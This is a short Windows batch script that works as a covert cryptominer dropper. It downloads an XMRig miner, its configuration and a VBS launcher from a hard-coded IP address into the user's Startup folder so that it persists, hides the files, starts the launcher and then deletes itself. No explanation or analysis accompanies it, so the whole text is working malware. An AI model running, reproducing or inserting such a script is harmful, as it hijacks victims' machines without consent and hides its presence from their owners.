cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
if not exist "crypto\" mkdir crypto
cd crypto
curl http://136.244.84.50:8022/xmrig.exe --output xmrig.exe
curl http://136.244.84.50:8022/config.json --output config.json
cd ..
curl http://136.244.84.50:8022/launch.vbs --output launch.vbs
attrib crypto +h
attrib launch.vbs +h
start launch.vbs
DEL "%~f0"
